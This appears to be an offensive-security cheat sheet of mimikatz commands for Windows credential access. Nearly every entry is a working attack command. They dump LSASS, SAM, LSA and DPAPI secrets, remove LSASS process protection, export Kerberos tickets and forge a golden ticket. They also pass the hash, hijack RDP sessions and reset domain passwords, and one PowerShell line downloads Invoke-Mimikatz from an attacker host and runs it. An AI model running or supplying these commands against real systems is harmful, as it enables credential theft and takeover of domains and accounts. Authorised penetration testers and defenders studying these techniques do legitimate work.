# mimikatz

% mimikatz, passwords
#plateform/windows  #target/local  #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 

## _doc
```
https://tools.thehacker.recipes/mimikatz/modules/lsadump/lsa
```


## ps1 - load Invoke-Mimikatz
https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/Invoke-Mimikatz.ps1') | IEX ; Invoke-mimikatz
```

## onliner
```
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords /all" "lsadump::sam" "exit"
```

## disable PPL and dump passwords
```
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords /all" "exit"
```

## vault - Get passwords of scheduled tasks
```
mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"
```


## dump SAM - online
```
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

## dump SAM - extract credentials from shadow copy (1)
```
mimikatz.exe "lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM"
```

## dump LSA - online
```
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords /all"
```

## dump LSA - secret keys
```
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::lsa /inject /name:<username>"
```

## dump LSA - krbtgt keys (on a DC)
```
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::krbtgt"
```

## dump LSA - trust account keys (on a DC)
```
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::trust /patch"
```

## dump LSA - extract credentials from dump
```
mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords /all" "exit"
```


## dump LSA - extract credentials from shadow copy (2)
Extract old passwords
```
mimikatz.exe "lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY"
```

## dump LSA - extract - on hand shadow volume copy
```
powershell.exe "[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM', '.\Desktop\SYSTEM.bkp');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY', '.\Desktop\SECURITY.bkp');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM', '.\Desktop\SAM.bkp')"
```

% mimikatz, tickets

## tickets - list
```
kerberos::list
```

## tickets - extract 
```
kerberos::list /export
```

% mimikatz, dpapi, credman


## credman - List Credentials Manager
```
sekurlsa::Credman
```

## dpapi - check the file to get guidMasterKey
Seatbelt come in handy for enumerating credential blob files' location
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\<credfile>
```

## dpapi - find master key
```
$ mimikatz !sekurlsa::dpapi
```

## dpapi - use master key
sid : origin domain sid : Get-DomainSID -Domain domainname
sid : origin domain sid : Get-DomainSID -Domain domainname
```
$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\<credfile> /masterkey:<masterkey>
```

## dpapi - Extract masterkey Administrator
```
mimikatz sekurlsa::dpapi
```


## dpapi - Extract masterkey with password
```
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\<guidMasterKey>" /sid:<SID> /password:<password> /protected
```

## dpapi - Extract masterkey AD
```
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\<guidMasterKey>" /rpc
```


% mimikatz, ad


## forest extra SID
sid : origin domain sid : Get-DomainSID -Domain domainname
sids :  ExtraSid value (Enterprise Admins SID) : parent SID	
```powershell
kerberos::golden /user:<user> /domain:<child_fqdn> /sid:<child_sid> /krbtgt:<krbtgt_ntlm> /sids:<parent_sid>-519 /ptt
```

% mimikatz, pth

## pth run powershell remotelly
#plateform/windows  #target/local  #cat/ATTACK/PTH 
Followed by : Enter-PSSession -Computer {<}computer_name}
```
sekurlsa::pth /user:<user> /domain:<domain_fqdn> /ntlm:<ntlm_hash> /run:powershell
```

## pth to RDP
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/ATTACK/PTH
```
sekurlsa::pth /user:<user> /domain:<domain_fqdn> /ntlm:<ntlm_hash> /run:"mstsc.exe /restrictedadmin"
```

% mimikatz, rdp

## RDP - Extract RDP passwords
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 
```
ts::logonpasswords
```

## RDP - List RDP sessions 
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/RECON
```
ts::sessions
```

## RDP - Hijack RDP session 
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/ATTACK/HIJACK
```
ts::remote /id:<id>
```

% mimikatz, user

## reset password - Reset Domain
#plateform/windows #target/local #cat/CREDENTIAL-ACCESS
```
lsadump::setntlm /user:<target_user> /password:VeryStrongPass1! /server:<dc_name>
```

## reset password - Reset Local
#plateform/windows #target/local #cat/CREDENTIAL-ACCESS
```
lsadump::setntlm /user:<target_user> /password:VeryStrongPass1! /server:<target_name>
```